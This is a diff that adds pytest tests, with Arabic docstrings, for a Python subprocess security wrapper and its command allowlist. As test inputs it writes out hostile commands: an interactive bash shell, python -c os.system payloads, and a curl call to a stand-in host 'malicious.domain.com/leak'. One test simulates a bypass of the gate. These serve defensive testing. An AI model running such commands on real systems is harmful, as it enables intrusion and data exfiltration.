@@ -2,7 +2,7 @@ import ast
 from pathlib import Path
 import pytest
 from unittest.mock import patch
-from scripts.security.security import safe_subprocess
+from scripts.security.security import safe_subprocess, safe_popen
 
 class TestSubprocessSecurity:
     """أمان الـ Subprocess"""
@@ -86,3 +86,78 @@ class TestSubprocessSecurity:
         _, kwargs = mock_run.call_args
         assert kwargs.get('timeout') is not None, "Security guard MUST enforce timeout"
         assert kwargs['timeout'] > 0
+
+    @patch('scripts.security.security.subprocess.Popen')
+    def test_safe_popen_forces_shell_false(self, mock_popen):
+        """يجب أن يجبر safe_popen shell=False حتى لو تم طلب True"""
+        safe_popen(["ffmpeg", "-version"], shell=True)
+        mock_popen.assert_called_once()
+        _, kwargs = mock_popen.call_args
+        assert kwargs.get('shell') is False, "Security guard MUST force shell=False for Popen"
+
+    def test_safe_subprocess_rejects_unallowed_command(self):
+        """يجب أن يرفض safe_subprocess الأوامر غير المصرح بها فوراً (منع حقن الأوامر)"""
+        with pytest.raises(PermissionError, match="Command not allowed"):
+            safe_subprocess(["sh", "-c", "whoami"])
+
+    def test_safe_popen_rejects_unallowed_command(self):
+        """يجب أن يرفض safe_popen الأوامر غير المصرح بها فوراً (منع حقن الأوامر)"""
+        with pytest.raises(PermissionError, match="Command not allowed"):
+            safe_popen(["bash", "-i"])
+
+    def test_subprocess_nosemgrep_rationale_documented(self):
+        """التحقق من توثيق تعليق nosemgrep المبرر على مواضع subprocess"""
+        sec_file = Path(__file__).parent.parent.parent / "scripts" / "security" / "security.py"
+        content = sec_file.read_text(encoding="utf-8")
+        assert "nosemgrep" in content, "nosemgrep annotation missing from scripts/security/security.py"
+        assert "CommandPolicy validates and allowlists executable" in content, "Rationale comment missing"
+
+    def test_tainted_input_strictly_prevented_by_command_policy(self):
+        """
+        Fix 3: أثبات أن CommandPolicy.validate_command يمنع الإدخال الملوّث تماماً.
+        محاولة تنفيذ أوامر خطرة مثل -c أو أوامر غير مدرجة بالقائمة البيضاء تُرفض فوراً.
+        """
+        dangerous_cmds = [
+            ["python", "-c", "import os; os.system('echo pwned')"],
+            ["python3", "-c", "open('/tmp/pwned', 'w').write('bad')"],
+            ["node", "-e", "process.exit(1)"],
+            ["sh", "-c", "whoami"],
+            ["curl", "https://malicious.domain.com/leak"],
+        ]
+        for cmd in dangerous_cmds:
+            with pytest.raises(PermissionError, match="Command not allowed"):
+                safe_subprocess(cmd)
+
+    def test_gate_bypass_simulation_behavior(self, monkeypatch):
+        """
+        اختبار سلوك البوابة عبر المحاكاة (Gate Behavior Verification via Simulation).
+        يوثق هذا الاختبار أن بوابة CommandPolicy.validate_command هي المسؤولة حصراً عن منع
+        الأوامر الملوثة، وأنه في حال محاكاة تجاوزها ستصل المدخلات للمنفذ الفرعي.
+        ملاحظة منهجية: هذا اختبار تحليلي لسلوك البوابة وليس دليلاً على حالة سابقة (Not a before-fix failure proof).
+        """
+        from scripts.core.security.command_policy import CommandPolicy, CommandValidationResult
+        malicious_cmd = ["python", "-c", "import os; os.system('whoami')"]
+
+        # محاكاة تجاوز البوابة لاختبار السلوك العزلي للبوابة
+        with patch('scripts.security.security.subprocess.run') as mock_run:
+            mock_run.return_value = None
+            monkeypatch.setattr(
+                CommandPolicy,
+                "validate_command",
+                lambda *args, **kwargs: CommandValidationResult(
+                    is_allowed=True,
+                    sanitized_cmd=list(malicious_cmd),
+                    executable=malicious_cmd[0],
+                    subcommand="-c",
+                    sanitized_env={},
+                    timeout_seconds=30,
+                    max_output_bytes=1000,
+                    cwd=Path("."),
+                    violations=[]
+                )
+            )
+            # في حال تجاوز البوابة (محاكاة)، يصل الأمر إلى subprocess.run:
+            safe_subprocess(malicious_cmd)
+            mock_run.assert_called_once()
+            called_cmd, _ = mock_run.call_args
+            assert called_cmd[0] == malicious_cmd
